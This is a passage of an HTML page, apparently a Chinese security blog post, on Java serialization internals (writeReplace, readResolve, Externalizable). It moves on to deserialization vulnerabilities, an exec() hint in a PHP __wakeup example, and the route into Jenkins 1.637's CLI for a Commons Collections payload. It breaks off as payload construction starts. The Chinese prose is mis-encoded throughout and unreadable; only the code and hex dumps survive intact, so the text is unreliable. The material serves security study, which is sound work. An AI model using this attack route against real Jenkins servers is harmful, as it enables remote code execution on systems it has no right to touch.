title="å…³äºwriteReplace()å’ŒreadResolve()"></a>å…³äº<code>writeReplace()</code>å’Œ<code>readResolve()</code></h3><p>åœ¨å‰é¢çš„æ‰§è¡Œæµç¨‹åˆ†æä¸­ï¼Œä¸ºäº†çªå‡ºä¸»è¦é€»è¾‘ï¼Œæˆ‘ä»¬ä¸»è§‚çš„å¿½ç•¥äº†ä¸€äº›å†…å®¹ï¼Œå…¶ä¸­å°±åŒ…æ‹¬äº†åºåˆ—åŒ–çš„<code>invokeWriteReplace()</code>å’Œååºåˆ—åŒ–çš„<code>invokeReadResolve()</code>ã€‚</p><p>ç°åœ¨å°±æ¥çœ‹çœ‹å®ƒä»¬åˆ†åˆ«æœ‰ä»€ä¹ˆä½œç”¨ï¼š</p><ul><li><p><code>writeReplace()</code></p><p>  è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œè¯¥å¯¹è±¡ä¸ºå®é™…è¢«åºåˆ—åŒ–çš„å¯¹è±¡ï¼Œåœ¨åŸå¯¹è±¡åºåˆ—åŒ–ä¹‹å‰è¢«è°ƒç”¨ï¼Œæ›¿æ¢åŸå¯¹è±¡æˆä¸ºå¾…åºåˆ—åŒ–å¯¹è±¡</p></li><li><p><code>readResolve()</code></p><p>  è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œè¯¥å¯¹è±¡ä¸ºå®é™…ååºåˆ—åŒ–çš„ç»“æœå¯¹è±¡ï¼Œåœ¨åŸå¯¹è±¡ååºåˆ—åŒ–ä¹‹åè¢«è°ƒç”¨ï¼Œä¸å½±å“åŸå¯¹è±¡çš„ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œä»…æ›¿æ¢ç»“æœ</p></li></ul><p>å†ä»å…·ä½“ç¤ºä¾‹æ¥ä½“ä¼šä¸€ä¸‹ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationReplacementClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> String replacementField;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">readResolve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> SerializationReplacementClass(<span class="string">"resolve"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">SerializationReplacementClass</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.replacementField = s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SerializationReplacementClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.replacementField = <span class="string">"replace"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationDemo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">writeReplace</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> SerializationReplacementClass();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">// omit</span></span><br><span class="line">        SerializationReplacementClass demo = (SerializationReplacementClass) in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ä»åºåˆ—åŒ–ä¹‹åå¾—åˆ°çš„äºŒè¿›åˆ¶ä¸²ä¸­å¯ä»¥çœ‹åˆ°ç›®æ ‡å¯¹è±¡å·²ç»è¢«æ›¿æ¢æˆäº†<code>SerializationReplacementClass</code>ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ac ed 00 05 73 72 00 1d  53 65 72 69 61 6c 69 7a    ....sr.. Serializ</span><br><span class="line">61 74 69 6f 6e 52 65 70  6c 61 63 65 6d 65 6e 74    ationRep lacement</span><br><span class="line">43 6c 61 73 73 32 71 ac  e9 c1 d3 0b 7b 02 00 01    Class2q. ....&#123;...</span><br><span class="line">4c 00 10 72 65 70 6c 61  63 65 6d 65 6e 74 46 69    L..repla cementFi</span><br><span class="line">65 6c 64 74 00 12 4c 6a  61 76 61 2f 6c 61 6e 67    eldt..Lj ava&#x2F;lang</span><br><span class="line">2f 53 74 72 69 6e 67 3b  78 70 74 00 07 72 65 70    &#x2F;String; xpt..rep</span><br><span class="line">6c 61 63 65                                         lace</span><br></pre></td></tr></table></figure></div><p>è€Œåœ¨ååºåˆ—åŒ–ä¹‹åå¾—åˆ°çš„å¯¹è±¡çš„<code>replacementField</code>å­—æ®µå€¼åˆ™ä¸º<code>resolve</code>ï¼Œä½†åœ¨æ­¤ä¹‹å‰<code>readObject()</code>ä¹Ÿä¼šè¢«æ­£å¸¸è°ƒç”¨ï¼Œå½“æ—¶<code>replacementField</code>å­—æ®µå€¼ä¸º<code>replace</code>ã€‚</p><h3 id="å…³äºExternalizable"><a href="#å…³äºExternalizable" class="headerlink" title="å…³äºExternalizable"></a>å…³äº<code>Externalizable</code></h3><p><code>Serializable</code>æ¥å£è¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒå¸¸è§çš„å­ç±»<code>Externalizable</code>ï¼Œå®ƒæ¯”å®ƒçˆ¸çˆ¸ç‰¹æ®Šçš„åœ°æ–¹å°±åœ¨äºå®ƒéœ€è¦è‡ªå·±å®ç°è¯»å†™æ–¹æ³• <em>ï¼ˆ<code>readExternal()</code>å’Œ<code>writeExternal()</code>ï¼‰</em> ï¼ŒåŒæ—¶å¿…é¡»åŒ…å«ä¸€ä¸ªè‡ªå·±çš„æ— å‚æ„é€ æ–¹æ³• <em>ï¼ˆé»˜è®¤éšå¼çš„ä¹Ÿå¯ä»¥ï¼‰</em> ã€‚</p><p>ä»ä»¥ç¤ºä¾‹è¯´è¯ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExternalizationDemo</span> <span class="keyword">implements</span> <span class="title">Externalizable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String stringField;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> intField;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        out.writeUTF(<span class="keyword">this</span>.stringField);</span><br><span class="line">        out.writeInt(<span class="keyword">this</span>.intField);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.stringField = <span class="string">"hello, i'm "</span> + in.readUTF();</span><br><span class="line">        <span class="keyword">this</span>.intField = in.readInt() + <span class="number">100000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExternalizationDemo</span><span class="params">(String s, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.stringField = s;</span><br><span class="line">        <span class="keyword">this</span>.intField = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExternalizationDemo</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>åºåˆ—åŒ–ä¹‹åå¾—åˆ°çš„äºŒè¿›åˆ¶ä¸²å¦‚ä¸‹ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ac ed 00 05 73 72 00 13  45 78 74 65 72 6e 61 6c    ....sr.. External</span><br><span class="line">69 7a 61 74 69 6f 6e 44  65 6d 6f d9 a9 04 75 84    izationD emo...u.</span><br><span class="line">5d 06 8f 0c 00 00 78 70  77 0b 00 05 67 79 79 79    ].....xp w...gyyy</span><br><span class="line">79 00 01 7d f1 78                                   y..&#125;.x</span><br></pre></td></tr></table></figure></div><p>ä¸<code>Serializable</code>çš„åŒºåˆ«ï¼š</p><ul><li>å¯¹è±¡çš„åºåˆ—åŒ–å±æ€§æ ‡å¿—ä½ä¸º<code>0x0c</code>ï¼ŒåŒ…æ‹¬<code>Serializable</code>å’ŒBlock Dataçš„æ ‡å¿—</li><li>åºåˆ—åŒ–ç±»çš„å­—æ®µä¸ªæ•°å›ºå®šä¸º0</li><li>åºåˆ—åŒ–è°ƒç”¨<code>writeExternalData()</code>è½¬ç»™ç±»è‡ªå®šä¹‰çš„å†™æ–¹æ³•ï¼Œå°†å†™å…¥çš„æ•°æ®åŒ…è£…åœ¨æ–°çš„Block Dataå—ä¸­ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚ä¸ºå—é•¿åº¦ <em>ï¼ˆä¸å«å—å¤´å°¾æ ‡è¯†ï¼‰</em></li><li>ååºåˆ—åŒ–è°ƒç”¨<code>readExternalData()</code>è½¬ç»™ç±»è‡ªå®šä¹‰çš„è¯»æ–¹æ³•ï¼Œå†è°ƒç”¨å¯¹è±¡çš„æ— å‚æ„é€ æ–¹æ³• <em>ï¼ˆè‹¥ä¸å­˜åœ¨ï¼Œåˆ™è¿”å›<code>null</code>ï¼‰</em> è¿›è¡Œå®ä¾‹åŒ–</li></ul><h2 id="ååºåˆ—åŒ–æ¼æ´"><a href="#ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´"></a>ååºåˆ—åŒ–æ¼æ´</h2><p>é€šè¿‡ä»¥ä¸Šå¯¹Javaçš„åºåˆ—åŒ–æœºåˆ¶çš„å¤§è‡´äº†è§£ï¼Œæˆ‘ä»¬å¯ä»¥æƒ³è±¡ä¸€ä¸ªåœºæ™¯ <em>ï¼ˆæœ‰åŸºç¡€çš„åŒå­¦å¯ä»¥è·³è¿‡æœ¬éƒ¨åˆ†å†…å®¹ï¼Œå½“ç„¶ï¼Œçœ‹ä¸€çœ‹ä¹Ÿæ²¡åå¤„ï¼‰</em> ï¼š</p><blockquote><p>å½“æœåŠ¡ç«¯å…è®¸æ¥æ”¶è¿œç«¯æ•°æ®è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œå®¢æˆ·ç«¯å¯ä»¥æä¾›ä»»æ„ä¸€ä¸ªæœåŠ¡ç«¯å­˜åœ¨çš„å¯¹è±¡ <em>ï¼ˆåŒ…æ‹¬ä¾èµ–åŒ…ä¸­çš„å¯¹è±¡ï¼‰</em> çš„åºåˆ—åŒ–äºŒè¿›åˆ¶ä¸²ï¼Œç”±æœåŠ¡ç«¯ååºåˆ—åŒ–æˆç›¸åº”å¯¹è±¡ã€‚å¦‚æœè¯¥å¯¹è±¡æ˜¯ç”±æ”»å‡»è€…ã€ç²¾å¿ƒæ„é€ ã€çš„æ¶æ„å¯¹è±¡ï¼Œè€Œå®ƒè‡ªå®šä¹‰çš„<code>readObject()</code>ä¸­å­˜åœ¨ç€ä¸€äº›ã€ä¸å®‰å…¨ã€çš„é€»è¾‘ï¼Œé‚£ä¹ˆåœ¨å¯¹å®ƒååºåˆ—åŒ–æ—¶å°±æœ‰å¯èƒ½å‡ºç°å®‰å…¨é—®é¢˜ã€‚</p></blockquote><p>è¯´åˆ°è¿™ï¼Œæˆ‘æä¸‰ä¸ªé—®é¢˜ï¼Œè¯·å¤§å®¶è·Ÿç€æˆ‘çš„æ€è·¯å»åˆ†æï¼Œå…ˆæ¥çœ‹çœ‹ç¬¬ä¸€ä¸ªï¼š</p><ol><li>ä¸ºä»€ä¹ˆéœ€è¦ä¾èµ–ååºåˆ—åŒ–å¯¹è±¡çš„è‡ªå®šä¹‰<code>readObject()</code>ï¼Ÿ</li></ol><p>å¤§å®¶éƒ½çŸ¥é“ï¼Œæ­£å¸¸æ¥è¯´ï¼Œååºåˆ—åŒ–åªæ˜¯ä¸€ä¸ªå¯¹è±¡å®ä¾‹åŒ–ç„¶åèµ‹å€¼çš„è¿‡ç¨‹ï¼Œå¦‚æœä¹‹åä¸ä¸»åŠ¨è°ƒç”¨å®ƒçš„å†…éƒ¨æ–¹æ³•ï¼Œç†è®ºä¸Šæœ€å¤šåªèƒ½æ§åˆ¶å®ƒå­—æ®µçš„å€¼è€Œå·²ã€‚é‚£ä¹ˆæœ‰æ²¡æœ‰ä»€ä¹ˆåŠæ³•èƒ½å¤Ÿè®©å®ƒæ‰§è¡Œååºåˆ—åŒ–ä»¥å¤–çš„é€»è¾‘å‘¢ï¼Ÿæ¯•ç«Ÿåšçš„è¶Šå¤šä¸­é—´äº§ç”Ÿé—®é¢˜çš„æ¦‚ç‡å°±è¶Šå¤§ã€‚</p><p>æˆ‘ä»¬è¿˜æ˜¯å…ˆä»¥å¤§å®¶æ›´ç†Ÿæ‚‰çš„PHPæ¥ä¸¾ä¸ªä¾‹ã€‚åœ¨PHPå†…éƒ¨ï¼Œä¿ç•™äº†åå¤šä¸ªè¢«ç§°ä¸ºé­”æœ¯æ–¹æ³•çš„ç±»æ–¹æ³•ï¼Œè¿™äº›é­”æœ¯æ–¹æ³•ä¸€èˆ¬ä¼šä¼´éšç€ç±»çš„ç”Ÿå‘½å‘¨æœŸè¢«PHPåº•å±‚è‡ªåŠ¨è°ƒç”¨ï¼Œç”¨æˆ·å¯ä»¥åœ¨ç±»ä¸­æ˜¾å¼å®šä¹‰å®ƒä»¬çš„é€»è¾‘ã€‚</p><p>å°±æ‹¿ä¸ååºåˆ—åŒ–å…³ç³»æœ€å¯†åˆ‡çš„<code>__wakeup()</code>æ¥è¯´ï¼Œæˆ‘ä»¬å›åˆ°æœ€åˆçš„é‚£ä¸ªç±»<code>SerializationDemo</code>ï¼Œç»™å®ƒåŠ ä¸€ç‚¹ä¸œè¥¿ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SerializationDemo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;stringField;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>åœ¨ååºåˆ—åŒ–<code>SerializationDemo</code>è¿™ä¸ªå¯¹è±¡æ—¶ï¼Œå°±ä¼šè°ƒç”¨<code>__wakeup()</code>æ‰§è¡Œé‡Œé¢çš„é€»è¾‘ã€‚ç¤ºä¾‹ä¸­çš„é€»è¾‘åªæ˜¯è¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æœæ”¹æˆ<code>exec($this-&gt;stringField);</code>å‘¢ï¼Ÿ</p><p>å®é™…å½“ç„¶ä¸ä¼šè¿™ä¹ˆç®€å•ï¼Œæœ‰å¯èƒ½å®ƒæ˜¯æŠŠè‡ªå·±çš„å­—æ®µä½œä¸ºå€¼ä½œä¸ºå‚æ•°è°ƒç”¨äº†æŸä¸ªç±»çš„æ–¹æ³•ï¼Œè€Œé‚£ä¸ªæ–¹æ³•é‡Œå¯¹å‚æ•°åšäº†æŸäº›ä¸å®‰å…¨çš„æ“ä½œï¼Œç”šè‡³æœ‰å¯èƒ½ç»è¿‡å¤šä¸ªç±»å¤šä¸ªæ–¹æ³•è°ƒç”¨ï¼Œå½¢æˆä¸€ä¸ªè°ƒç”¨é“¾ã€‚</p><p>è¿™å°±æ˜¯é»˜è®¤çš„ååºåˆ—åŒ–é€»è¾‘çš„ä¸€ä¸ªé€ƒé€¸è¿‡ç¨‹ã€‚</p><p>åˆ°è¿™é‡Œä½ å¯èƒ½å·²ç»æƒ³åˆ°äº†ï¼ŒJavaååºåˆ—åŒ–ä¸­<code>readObject()</code>çš„ä½œç”¨å…¶å®å°±ç›¸å½“äºPHPååºåˆ—åŒ–ä¸­çš„é‚£äº›é­”æœ¯æ–¹æ³•ï¼Œä½¿ååºåˆ—åŒ–è¿‡ç¨‹åœ¨ä¸€å®šç¨‹åº¦ä¸Šå—æ§æˆä¸ºå¯èƒ½ï¼Œä½†ä¹Ÿåªæ˜¯å¯èƒ½è€Œå·²ï¼Œæ˜¯å¦çœŸçš„å¯æ§ï¼Œè¿˜æ˜¯éœ€è¦åˆ†ææ¯ä¸ªå¯¹è±¡çš„<code>readObject()</code>å…·ä½“æ˜¯å¦‚ä½•å®ç°çš„ <em>ï¼ˆåˆ«æ€¥ï¼Œåé¢æœ‰ç« èŠ‚ä¼šæœ‰è¯¦ç»†ä»‹ç»ï¼‰</em> ã€‚</p><p>æ¥ç€çœ‹ç¬¬äºŒä¸ªé—®é¢˜ï¼š</p><ol start="2"><li>ååºåˆ—åŒ–å¯¹è±¡çš„é<code>Serializable</code>çˆ¶ç±»æ— å‚æ„é€ æ–¹æ³•æ˜¯å¦èƒ½åƒPHPä¸­çš„<code>__construct()</code>ä¸€æ ·è¢«åˆ©ç”¨ï¼Ÿ</li></ol><p>ç­”æ¡ˆåº”è¯¥æ˜¯ä¸è¡Œçš„ã€‚å› ä¸ºå‰é¢å·²ç»æåˆ°è¿‡ï¼Œæˆ‘ä»¬åªèƒ½å¤Ÿæ§åˆ¶ååºåˆ—åŒ–å¯¹è±¡çš„å­—æ®µå€¼ï¼Œè€ŒJavaä¸PHPä¸åŒçš„æ˜¯ï¼ŒJDKåº•å±‚ä¼šå…ˆè°ƒç”¨æ— å‚æ„é€ æ–¹æ³•å®ä¾‹åŒ–ï¼Œå†è¯»å–åºåˆ—åŒ–çš„å­—æ®µæ•°æ®èµ‹å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬æ²¡æœ‰åŠæ³•å°†å¯æ§çš„å­—æ®µå€¼åœ¨å®ä¾‹åŒ–é˜¶æ®µä¼ å…¥æ„é€ æ–¹æ³•ä¸­å¯¹å…¶å†…éƒ¨é€»è¾‘äº§ç”Ÿå½±å“ã€‚</p><p>æœ€åä¸€ä¸ªï¼š</p><ol start="3"><li><code>readResolve()</code>å¯¹ååºåˆ—åŒ–æ¼æ´æœ‰ä»€ä¹ˆå½±å“ï¼Ÿ</li></ol><p><code>readResolve()</code>åªæ˜¯æ›¿æ¢ååºåˆ—åŒ–ç»“æœå¯¹è±¡ï¼Œè‹¥æ˜¯ç»“æœå¯¹è±¡æœ¬èº«å­˜åœ¨å®‰å…¨é—®é¢˜ï¼Œå®ƒæœ‰å¯èƒ½è®©é—®é¢˜ä¸­æ–­ï¼›è‹¥æ˜¯<code>readObject()</code>å­˜åœ¨å®‰å…¨é—®é¢˜ï¼Œå®ƒæ— æ³•é¿å…ã€‚</p><h3 id="ç»å…¸çš„Apache-Commons-Collections"><a href="#ç»å…¸çš„Apache-Commons-Collections" class="headerlink" title="ç»å…¸çš„Apache Commons Collections"></a>ç»å…¸çš„Apache Commons Collections</h3><p>å¥½ï¼Œæœ‰äº†ä¸Šé¢çš„åŸºç¡€ï¼Œæˆ‘ä»¬ä¹Ÿç…§ä¸€å›æƒ¯ä¾‹ï¼Œå¸¦å¤§å®¶ä¸€èµ·åˆ†æä¸€ä¸‹Javaå†å²ä¸Šæœ€å‡ºåä¹Ÿæ˜¯æœ€å…·ä»£è¡¨æ€§çš„Apache Commons Collectionsååºåˆ—åŒ–æ¼æ´ã€‚</p><p>ç½‘ä¸Šå¾ˆå¤šæ–‡ç« éƒ½æ˜¯ä»¥WebLogicä¸ºæ¼æ´ç¯å¢ƒï¼Œæˆ‘ä»¬å°Šé‡å¼€æºï¼Œå›´ç»•1.637ç‰ˆæœ¬çš„Jenkinsæ¥å¼€ä¸ªå¤´ï¼Œå…ˆç®€å•çœ‹çœ‹å®ƒçš„Cliç»„ä»¶çš„ååºåˆ—åŒ–åœºæ™¯ <em>ï¼ˆè¿™é‡Œåªä»¥CLI-connectåè®®ä¸ºä¾‹ï¼ŒCLI2-connectä¼šå¤šå‡ºæ¥ä¸€ä¸ªSSLåŠ è§£å¯†çš„è¿‡ç¨‹ï¼Œè¿™ä¹Ÿæ˜¯å¾ˆå¤šå…¬å¼€PoCåœ¨æ¨¡æ‹ŸCliæ¡æ‰‹æ—¶é€‰æ‹©CLI-connectåè®®çš„åŸå› ï¼‰</em> ï¼š</p><ol><li>å®¢æˆ·ç«¯å‘å‘é€ä¸€ä¸ªUTF8å­—ç¬¦ä¸²<code>Protocol:CLI-connect</code>ï¼Œå‰ä¸¤ä½ä¸ºå­—ç¬¦ä¸²é•¿åº¦</li><li>æœåŠ¡ç«¯<code>TcpSlaveAgentListener</code>åœ¨æ¥æ”¶åˆ°æ•°æ®ä¹‹åï¼Œä¼šåˆ›å»ºä¸€ä¸ª<code>ConnectionHandler</code>å¯¹è±¡è¯»å–ä¸€ä¸ªUTF8å­—ç¬¦ä¸²ï¼Œåˆ¤æ–­åè®®ç‰ˆæœ¬ï¼Œäº¤ç»™å¯¹åº”çš„åè®®è¿›è¡Œå¤„ç†<ul><li><code>CliProtocol</code>å“åº”<code>Welcome</code>å­—ç¬¦ä¸²ï¼Œç”±<code>ChannelBuilder</code>ä¸ºä¸¤ç«¯åˆ›å»ºä¸€ä¸ªåŒ…å«äº†<code>Connection</code>å¯¹è±¡ <em>ï¼ˆIOæµå¯¹è±¡åœ¨é‡Œé¢ï¼‰</em> çš„<code>Channel</code>é€šä¿¡é€šé“ï¼Œå¹¶è°ƒç”¨<code>negotiate()</code>è¿›è¡Œäº¤äº’<ul><li><code>Capability.writePreamble()</code>å“åº”åºåˆ—åŒ–åçš„<code>Capability</code>å¯¹è±¡ï¼Œå…¶ä¸­ä½¿ç”¨<code>Mode.TEXT.wrap()</code>å°†è¾“å‡ºæµåŒ…è£…ä¸º<code>BinarySafeStream</code>ï¼Œå®ƒä¼šåœ¨å†™æ—¶è¿›è¡ŒBase64ç¼–ç </li><li>ç”±äº<code>ChannelBuilder</code>åœ¨buildä¹‹å‰ï¼Œè°ƒç”¨äº†<code>withMode()</code>è®¾ç½®<code>mode</code>ä¸º<code>Mode.BINARY</code>ï¼Œå› æ­¤è¿˜ä¼šå“åº”ä¸€ä¸ª<code>0x00000000</code></li><li>ç­‰å¾…æ¥æ”¶åç»­æ•°æ®ï¼Œåˆ¤æ–­æ•°æ®å†…å®¹å‰ç¼€ä¸º<code>Capability.PREAMBLE</code> <em>ï¼ˆ<code>&lt;===[JENKINS REMOTING CAPACITY]===&gt;</code>ï¼‰</em> æ—¶ï¼Œå°†<code>InputStream</code>ä¼ ç»™<code>Capability.read()</code><ul><li><code>Capability</code>åŒæ ·ä¼šå¯¹è¾“å…¥æµåšä¸€æ¬¡<code>BinarySafeStream</code>åŒ…è£…ï¼Œä¿è¯åœ¨è¯»æ•°æ®æ—¶è§£ç å¾—åˆ°åŸå§‹äºŒè¿›åˆ¶æ•°æ®ï¼Œå†æ‰”ç»™è¾“å…¥æµçš„<code>readObject()</code>ç»§ç»­è¯»</li></ul></li></ul></li></ul></li></ol><p>å›çœ‹<code>Connection</code>ä¸­è‡ªå®šä¹‰çš„<code>readObject()</code>ï¼Œæ˜¯ä¸€ä¸ªæ™®æ™®é€šé€šçš„<code>ObjectInputStream</code>ååºåˆ—åŒ–ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">readObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line">    <span class="keyword">return</span> (T)ois.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ç°åœ¨æˆ‘ä»¬å‡è®¾å·²çŸ¥1.637ç‰ˆæœ¬çš„Jenkinså¼•ç”¨äº†å­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„Commons Collectionsçš„ç‰ˆæœ¬çš„JaråŒ…ï¼Œé‚£ä¹ˆåªéœ€è¦åˆ©ç”¨å®ƒæ„é€ ä¸€ä¸ªæ¶æ„å¯¹è±¡çš„åºåˆ—åŒ–ä¸²ï¼Œåœ¨ä¸Jenkins Cliå®Œæˆæ¡æ‰‹ä¹‹åï¼Œå°†å…¶Base64ç¼–ç åçš„å­—ç¬¦ä¸²å‘é€è¿‡å»å°±è¡Œäº† <em>ï¼ˆå½“ç„¶ï¼Œåƒä¸‡åˆ«å¿˜äº†å‰é¢é‚£ä¸²é…·é…·çš„å‰ç¼€ï¼‰</em> ã€‚</p><hr><h2 id="Payloadæ„é€ "><a href="#Payloadæ„é€ " class="headerlink" title="Payloadæ„é€ "></a>Payloadæ„é€ </h2><p>å¥½çš„ï¼Œç°åœ¨è®©æˆ‘ä»¬èšç„¦åˆ°Commons Collectionså†…éƒ¨ï¼Œçœ‹çœ‹å‰è¾ˆä»¬æ˜¯å¦‚ä½•åˆ©ç”¨å®ƒæ¥è®©åº”ç”¨ã€äº§ç”Ÿã€é—®é¢˜çš„ã€‚</p><p>æˆ‘ä»¬å…ˆé¢„å¤‡ä¸€ä¸ªåŸºæœ¬çŸ¥è¯†ï¼Œåœ¨Javaä¸­ï¼Œè‹¥æƒ³é€šè¿‡å…¶åŸç”ŸJDKæä¾›çš„æ¥å£æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œæœ€å¸¸è§çš„è¯­å¥å¦‚ä¸‹ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime rt = Runtime.getRuntime();</span><br><span 